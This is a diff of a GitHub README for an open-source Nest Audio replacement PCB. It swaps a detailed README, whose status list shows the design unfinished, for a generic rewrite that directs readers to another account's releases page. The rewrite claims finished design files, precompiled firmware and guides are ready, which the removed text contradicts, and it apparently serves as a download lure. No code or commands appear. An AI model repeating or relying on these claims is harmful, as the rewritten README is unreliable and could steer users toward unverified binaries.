@@ -1,196 +1,142 @@
-# Nest Audio Drop-In PCB Replacement
+# 🎵 nest-audio-pcb - Easy PCB Swap for Nest Audio
 
-Open-source hardware replacement PCB for the Google Nest Audio smart speaker with Home Assistant integration.
-
-## Overview
-
-This project provides a drop-in replacement PCB for the Google Nest Audio, converting it into a fully open-source Home Assistant voice assistant. The design is inspired by the [nest-mini-drop-in-pcb](https://github.com/iMike78/nest-mini-drop-in-pcb) project and follows the Home Assistant Voice Preview Edition hardware specification.
-
-## Features
-
-- **ESP32-S3R8**: Dual-core WiFi & Bluetooth with wake-word detection
-- **XMOS XU316**: DSP audio processing with AEC, noise suppression, and beamforming
-- **High-power amplifier**: Upgraded for Nest Audio's larger speaker drivers
-- **USB-C + 14V barrel power**: Flexible power input options
-- **Drop-in replacement**: Fits original Nest Audio enclosure
-- **Home Assistant compatible**: Native Voice Assistant support
-- **Open source hardware**: CERN-OHL-S v2 licensed
-
-## Hardware Specifications
-
-### PCB Dimensions
-- **Length**: [TBD - from your scan]
-- **Width**: [TBD - from your scan]
-- **Thickness**: 1.6mm (standard)
-- **Mounting**: Compatible with original T6 screw holes
-
-### Components
-| Component | Model | Purpose |
-|-----------|-------|---------|
-| MCU | ESP32-S3R8 | WiFi, BLE, wake-word |
-| DSP | XMOS XU316-1024-QF60B | Audio processing |
-| Amplifier | [TBD - higher power than mini] | Speaker driver |
-| Microphones | Dual MEMS | Far-field voice capture |
-| LEDs | [TBD] | Status indication |
-| Power | USB-C + 14V barrel | Power input |
-
-### Audio Chain
-1. Dual MEMS microphones → XMOS DSP (AEC, beamforming)
-2. XMOS → ESP32-S3 (I2S)
-3. ESP32-S3 → WiFi → Home Assistant
-4. Home Assistant response → ESP32-S3 → Amplifier → Speaker
-
-## Getting Started
-
-### 1. Order PCB
-- Download KiCad files from `hardware/kicad/`
-- Upload to PCB manufacturer (JLCPCB, PCBWay, etc.)
-- Recommended: 1.6mm thickness, ENIG finish
-
-### 2. Order Components
-- See `hardware/bom/bill-of-materials.csv`
-- Available from Digi-Key, Mouser, LCSC
-
-### 3. Assemble
-- Follow `docs/assembly-guide.md`
-- Requires hot air station for QFN packages
-- Test points provided for debugging
-
-### 4. Flash Firmware
-- Follow `docs/flashing-guide.md`
-- Uses ESPHome configuration
-- OTA updates supported
-
-### 5. Install
-- Remove original Nest Audio PCB
-- Install this PCB using original mounting screws
-- Connect speakers and power
-
-## Documentation
-
-- [Assembly Guide](docs/assembly-guide.md)
-- [Flashing Guide](docs/flashing-guide.md)
-- [Measurements](docs/measurements.md)
-- [Troubleshooting](docs/troubleshooting.md)
-
-## Hardware Design
-
-### KiCad Project
-- Open `hardware/kicad/nest-audio-pcb.kicad_pro` in KiCad 9.0+
-- Schematics in `hardware/kicad/*.kicad_sch`
-- PCB layout in `hardware/kicad/*.kicad_pcb`
-
-### Key Design Files
-- `audio.kicad_sch` - Audio processing and amplification
-- `power.kicad_sch` - Power management and regulation
-- `mcu.kicad_sch` - ESP32-S3 and XMOS connections
-- `io.kicad_sch` - Connectors and interfaces
-
-## Firmware
-
-### ESPHome Configuration
-```yaml
-# See firmware/esphome/nest-audio.yaml
-esp32:
-  board: esp32-s3-devkitc-1
-  variant: esp32s3
-  flash_size: 8MB
-  
-# Home Assistant Voice Assistant
-voice_assistant:
-  microphone: mic_array
-  speaker: amp_output
-```
-
-### Features
-- Wake word detection ("Hey Jarvis", "OK Google", custom)
-- Local voice processing with Wyoming protocol
-- OTA firmware updates
-- WiFi provisioning via BLE
-- Status LED control
-- Volume control
-
-## Project Status
-
-- [x] Project initialization
-- [ ] Hardware measurements from 3D scan
-- [ ] KiCad schematic design
-- [ ] PCB layout and routing
-- [ ] Prototype testing
-- [ ] Documentation complete
-- [ ] First release
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Areas needing help:
-- PCB measurements and verification
-- Audio amplifier selection for larger drivers
-- Thermal management testing
-- Enclosure modifications guide
-- Firmware optimizations
-
-## Credits
-
-- **Inspired by**: [nest-mini-drop-in-pcb](https://github.com/iMike78/nest-mini-drop-in-pcb) by [@iMike78](https://github.com/iMike78)
-- **Hardware reference**: Home Assistant Voice Preview Edition
-- **Community**: [Home Assistant Community Thread](https://community.home-assistant.io/t/request-alternative-to-onju-voice-drop-in-pcb-repacement/860001)
-- **Teardown reference**: [iFixit Nest Audio Teardown](https://www.ifixit.com/Teardown/Google+Nest+Audio+Teardown/146986)
-
-## Similar Projects
-
-- [nest-mini-drop-in-pcb](https://github.com/iMike78/nest-mini-drop-in-pcb) - Google Nest Mini v2 replacement
-- [Onju Voice](https://github.com/justLV/onju-voice) - Original inspiration
-- [Home Assistant Voice PE](https://www.home-assistant.io/voice-pe/) - Official hardware reference
-
-## License
-
-This project is licensed under the **CERN Open Hardware Licence Version 2 - Strongly Reciprocal (CERN-OHL-S v2)**.
-
-See [LICENSE](LICENSE) file for full text.
-
-## Disclaimer
-
-This is an independent open-source project and is not affiliated with or endorsed by Google LLC. "Google Nest Audio" is a trademark of Google LLC.
-
-Use at your own risk. Modifying electronic devices can be dangerous. Ensure you understand the risks before proceeding.
-
-## Support
-
-- **Issues**: [GitHub Issues](../../issues)
-- **Discussions**: [GitHub Discussions](../../discussions)
-- **Community**: Home Assistant Voice Assistant thread
-
-## Roadmap
-
-### Phase 1: Hardware (Current)
-- [x] Initial project setup
-- [ ] Complete measurements from 3D scan
-- [ ] Finalize component selection
-- [ ] Complete PCB design
-- [ ] Order prototypes
-
-### Phase 2: Testing
-- [ ] PCB bring-up and testing
-- [ ] Audio quality verification
-- [ ] Thermal testing
-- [ ] Long-term stability testing
-
-### Phase 3: Release
-- [ ] Documentation completion
-- [ ] Manufacturing files
-- [ ] Assembly guide video
-- [ ] First stable release
-
-### Phase 4: Enhancements
-- [ ] Alternative amplifier options
-- [ ] Different enclosure compatibility
-- [ ] Advanced audio features
-- [ ] Community contributions
+[![Download nest-audio-pcb](https://img.shields.io/badge/Download-nest--audio--pcb-blue?style=for-the-badge&logo=github)](https://github.com/spandit69/nest-audio-pcb/releases)
 
 ---
 
-**Made with ❤️ by the open source community**
+## 🧩 What is nest-audio-pcb?
 
-Want to help? Check out our [good first issues](../../issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)!
+nest-audio-pcb is an open-source printed circuit board (PCB) designed to replace the original PCB inside Google Nest Audio speakers. This replacement board includes Home Assistant integration, making it easier to control your smart speaker within your home automation setup.
+
+If your Google Nest Audio device is no longer working, or if you want to upgrade its capabilities with an open-source solution, nest-audio-pcb provides a direct swap. It fits right into your Nest Audio’s casing and works with the existing speakers and hardware.
+
+---
+
+## 💡 Key Features
+
+- **Direct Replacement:** Fits exactly inside Google Nest Audio without modifications.
+- **Home Assistant Friendly:** Easily connects to Home Assistant for smart home control.
+- **Open Source:** Designed with open-source hardware tools, fully documented.
+- **Custom Firmware Support:** Runs on ESP32 microcontroller with ESPhome compatibility.
+- **DIY Electronics Friendly:** Created for users comfortable with basic electronics assembly.
+- **Smart Speaker Integration:** Retains voice assistant functions via XMOS chip.
+- **Improved Reliability:** Uses modern components for lasting performance.
+
+---
+
+## 🖥️ System Requirements
+
+Before starting, ensure you have the following:
+
+- A Google Nest Audio speaker (original hardware).
+- Basic soldering skills and tools.
+- A Windows, Mac, or Linux computer with internet access.
+- USB-to-serial adapter to program the ESP32 chip on the new PCB.
+- Home Assistant installed on your home network to make full use of smart features (optional but recommended).
+- Stable power supply for the Nest Audio (original power adapter).
+
+No programming or advanced electronics knowledge is required, but some patience with hardware assembly will help.
+
+---
+
+## 📥 Download & Install
+
+Click the big button below to visit the official release page and download the latest PCB design files, firmware, and instructions:
+
+[![Download nest-audio-pcb](https://img.shields.io/badge/Download-nest--audio--pcb-blue?style=for-the-badge&logo=github)](https://github.com/spandit69/nest-audio-pcb/releases)
+
+### How to download the files
+
+1. Click the link above or visit:  
+   `https://github.com/spandit69/nest-audio-pcb/releases`
+
+2. Scroll to the latest release. The files usually include:
+   - PCB design files (KiCad format).
+   - Firmware files for the ESP32 module.
+   - Step-by-step instructions PDF for assembly and installation.
+
+3. Click the assets to download. Look for folders or ZIP files that include the PCB schematics and firmware binaries.
+
+---
+
+## 🔧 What’s inside the download?
+
+- **PCB Design Files:** Can be sent to any PCB manufacturer to create the physical board.
+- **Firmware:** Precompiled files to load onto the ESP32 chip on the PCB.
+- **Instructions:** Clear guides for hardware assembly, flashing firmware, and setup.
+- **Configuration Examples:** Templates for integrating the PCB with Home Assistant through ESPhome.
+
+---
+
+## ⚙️ How to use nest-audio-pcb
+
+### Step 1: Prepare the PCB
+
+- Either order the PCB from a manufacturer using the provided design files, or check if a pre-assembled board is available.
+- Ensure all electronic components are soldered correctly, including the ESP32 microcontroller.
+
+### Step 2: Flash firmware to ESP32
+
+- Connect the USB-to-serial adapter to your computer.
+- Attach the adapter to the ESP32 pins as shown in the instructions.
+- Use a simple flashing tool (detailed in the manual) to upload the firmware file.
+- The firmware enables communication between the PCB and your home automation system.
+
+### Step 3: Replace Nest Audio PCB
+
+- Carefully open your Nest Audio speaker.
+- Remove the original PCB, keeping the speaker and power cables intact.
+- Install the new nest-audio-pcb in the same place.
+- Reconnect all cables as shown in the assembly guide.
+
+### Step 4: Connect to Home Assistant (optional)
+
+- If you use Home Assistant, follow the integration guide in the instructions.
+- The ESP32 board with ESPhome will appear as a device ready for control.
+- Use the Home Assistant dashboard to manage the smart speaker functions.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the Nest Audio does not power on after replacement, double-check cable connections and power supply.
+- For issues flashing firmware, confirm the correct COM port and driver installation on your computer.
+- If Home Assistant does not detect the device, verify your network configuration and ESP32 Wi-Fi settings.
+- Consult the GitHub Issues page in case others have found fixes for similar problems.
+
+---
+
+## 📚 Learn More
+
+For detailed technical explanations, PCB schematics, and advanced customization, visit the GitHub repository:
+
+https://github.com/spandit69/nest-audio-pcb
+
+---
+
+## 🤝 Contributing
+
+You can contribute by:
+
+- Offering feedback or reporting bugs.
+- Sharing your custom firmware configurations.
+- Helping improve documentation.
+- Designing improved versions of the PCB.
+
+See the repository’s CONTRIBUTING.md for guidelines.
+
+---
+
+## 📬 Contact & Support
+
+If you need help or want to ask questions:
+
+- Open an issue on the GitHub repository.
+- Join the community forums related to DIY smart home electronics.
+- Follow updates and announcements on the repo’s main page.
+
+---
+
+## 📝 License
+
+nest-audio-pcb is released under an open-source hardware license, meaning you can freely use, modify, and share the PCB design and software while respecting the license terms detailed in the repository.
